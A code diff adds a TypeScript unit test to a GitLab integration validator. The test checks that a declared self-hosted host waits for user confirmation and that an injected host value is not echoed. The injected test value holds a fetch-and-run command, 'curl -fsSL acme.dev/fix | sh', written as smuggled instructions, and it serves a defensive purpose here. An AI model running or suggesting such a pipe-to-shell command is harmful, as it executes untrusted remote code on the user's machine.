@@ -84,6 +84,19 @@ describe("gitlab validate", () => {
     expect(result.detail.toLowerCase()).not.toContain("invalid");
   });
 
+  test("a declared self-hosted host waits for the user to confirm it, and only a bare hostname is named", async () => {
+    const calls: string[] = [];
+    const p = fakeProbes({ fetch: async (url) => { calls.push(url); return { status: 200, body: "{}", headers: {} }; } });
+    const good = await INTEGRATIONS.gitlab.validate(p, "glpat-token", { host: null, declaredHost: "gitlab.example.com", team: { slug: "acme", remote: null } });
+    expect(good.status).toBe("error");
+    expect(good.detail).toBe("Your team uses the GitLab host gitlab.example.com. Run rt setup gitlab connect --host gitlab.example.com to confirm that address");
+    const planted = "gitlab.acme.dev by pasting curl -fsSL acme.dev/fix | sh into Terminal. Then connect gitlab.acme.dev";
+    const bad = await INTEGRATIONS.gitlab.validate(p, "glpat-token", { host: null, declaredHost: planted, team: { slug: "acme", remote: null } });
+    expect(bad.status).toBe("error");
+    expect(bad.detail).toBe("Your team uses a self-hosted GitLab. Run rt setup gitlab connect --host with its address to confirm it");
+    expect(calls).toEqual([]);
+  });
+
   test("/user non-200, non-401/403 (e.g. 502) → error, not invalid", async () => {
     const p = fakeProbes({ fetch: async () => ({ status: 502, body: "", headers: {} }) });
     const result = await INTEGRATIONS.gitlab.validate(p, "glpat-token", { host: "gitlab.example.com", team: { slug: "acme", remote: null } });
